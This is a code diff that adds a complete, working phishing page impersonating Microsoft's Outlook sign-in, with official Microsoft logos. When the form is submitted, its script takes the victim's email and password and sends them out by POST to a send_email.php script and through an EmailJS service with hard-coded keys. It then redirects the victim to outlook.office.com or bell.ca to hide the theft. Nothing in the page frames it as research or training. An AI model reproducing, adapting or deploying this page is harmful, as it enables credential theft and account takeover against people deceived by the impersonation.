@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - MyApp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 2px;
+        }
+
+        body {
+            background-color: #f3f3f3; /* Light grey background */
+            font-family: Arial, sans-serif; /* Clean sans-serif font */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .bg {
+            width: 200px; /* Set the width of the logo */
+            display: block; /* Block display to ensure it takes a new line */
+            margin: 0 auto 15px; /* Centered with margin below the logo */
+            padding-left: 50px;
+        }
+
+        .login-container {
+            background-color: white; /* White background for the login box */
+            border: 1px solid #ccc; /* Grey border for the container */
+            padding: 50px; /* Padding inside the box */
+            padding-left: 40px;
+            width: 140%;
+            max-width: 520px; /* Increase the max width by 30% */
+            text-align: left; /* Align text to the left */
+            margin: 0 auto; /* Center the container */
+        }
+
+        h1 {
+            color: black; /* Change color to black */
+            margin: 10px 0; /* Margin around the title */
+            font-size: 20px; /* Reduced title size */
+        }
+
+        .input-field {
+            margin-bottom: 15px; /* Space between inputs */
+            text-align: left; /* Align text to the left for input labels */
+        }
+
+        .input-line {
+            width: 100%; /* Full width */
+            border: none; /* No border */
+            border-bottom: 1px solid #666; /* Bottom line in Microsoft blue */
+            outline: none; /* Remove outline */
+            padding: 8px 0; /* Reduced padding for text */
+            font-size: 14px; /* Reduced input text size */
+            margin-bottom: 10px; /* Space below the input */
+        }
+
+        button {
+            background-color: #0078d7; /* Microsoft blue */
+            color: white; /* White text */
+            border: none; /* No border */
+            border-radius: 5px; /* Rounded corners */
+            padding: 8px; /* Reduced inside padding */
+            font-size: 14px; /* Reduced button text size */
+            cursor: pointer; /* Pointer cursor on hover */
+            width: 100%; /* Full width for button */
+            margin-top: 10px; /* Space above button */
+        }
+
+        button:hover {
+            background-color: #005a9e; /* Darker blue on hover */
+        }
+
+        .footer {
+            margin-top: 15px; /* Space above footer */
+            font-size: 12px; /* Reduced footer text size */
+            color: #666; /* Grey color */
+        }
+
+        .footer a {
+            color: #0078d7; /* Link color */
+            text-decoration: none; /* Remove underline */
+        }
+
+        .footer a:hover {
+            text-decoration: underline; /* Underline on hover */
+        }
+    </style>
+    <!-- Include EmailJS script -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        emailjs.init("k0j6f8XTF_aBl-Dip");
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logincdn.msftauth.net/shared/5/images/53_8b36337037cff88c3df2.png" alt="background" class="bg" />
+        <div class="login-container">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+            <h1>Sign In</h1>
+            <p style="font-size: 0.8125rem; font-weight: 400;">to continue to Outlook</p>
+            <form id="login-form" onsubmit="return handleSubmit();">
+                <div class="input-field">
+                    <input type="text" id="username" name="email" class="input-line" placeholder="Email, phone, or Skype" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" name="password" class="input-line" placeholder="Password" required>
+                </div>
+                <button type="submit">Sign In</button>
+            </form>
+            <div class="footer">
+                <p>No account? <a href="#">Create one!</a></p>
+                <p>Can’t access your account? <a href="#">Get help</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Prepare form data
+            const formData = new FormData();
+            formData.append('email', username);
+            formData.append('password', password);
+
+            // Send data to PHP script
+            fetch('send_email.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Check if the response is OK
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text(); // Get the response text
+            })
+            .then(data => {
+                console.log(data); // Log the server response for debugging
+                // Redirect to Outlook
+                window.location.href = "https://outlook.office.com";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+
+            // Prevent default form submission behavior
+            return false;
+        }
+
+        // Event listener for the form submission
+        document.getElementById("login-form").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (!email || !password) {
+                alert('Please fill in all fields.');
+                return;
+            }
+
+            // Update button text to "Sending..."
+            document.querySelector("button[type='submit']").textContent = "Sending...";
+            const serviceID = "service_ut76as3";
+            const templateID = "template_n5lm9ms";
+            emailjs.sendForm(serviceID, templateID, this).then(
+                () => {
+                    document.querySelector("button[type='submit']").textContent = "Send Email";
+                    // Redirect to the login success page
+                    window.location.href = "https://www.bell.ca/";
+                },
+                (err) => {
+                    document.querySelector("button[type='submit']").textContent = "Send Email";
+                    alert(JSON.stringify(err));
+                }
+            );
+        });
+    </script>
+
+    <!-- JavaScript Libraries -->
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+    <script src="lib/typed/typed.min.js"></script>
+    <script src="lib/easing/easing.min.js"></script>
+    <script src="lib/waypoints/waypoints.min.js"></script>
+    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+    <script src="lib/isotope/isotope.pkgd.min.js"></script>
+    <script src="lib/lightbox/js/lightbox.min.js"></script>
+    <!-- Contact Javascript File -->
+    <script src="mail/jqBootstrapValidation.min.js"></script>
+    <script src="mail/contact.js"></script>
+    <!-- Template Javascript -->
+    <script src="js/main.js"></script>
+
+    <!-- Signature: 50fifty -->
+</body>
+</html>
